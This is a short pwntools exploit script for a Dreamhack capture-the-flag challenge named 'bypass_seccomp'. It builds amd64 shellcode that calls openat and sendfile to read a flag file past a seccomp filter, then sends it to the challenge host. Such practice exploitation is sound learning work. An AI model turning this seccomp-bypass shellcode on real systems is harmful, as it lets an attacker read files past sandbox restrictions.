from pwn import *
from utils.pushstr import pushstr
elf = ELF('/home/kali/Downloads/dreamhack/bypassseccomp1/bypass_seccomp')

context.arch = 'amd64'
context.os = 'linux'
cyberedu = 'host8.dreamhack.games:16771'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p)

#openat, read, pwrite64.
shellcode_openat = asm(f"""
mov rdi, -100
{pushstr('flag')}
mov rsi, rsp
xor rdx, rdx

mov rax, 257
syscall
""")


shellcode_sendfile = asm('''
mov rsi, rax
mov rdi, 1
xor rdx, rdx
mov r10, 0x60

mov rax, 40
syscall
''')

shellcode = shellcode_openat + shellcode_sendfile
p.recvuntil(b": ")
p.send(shellcode)

p.interactive()
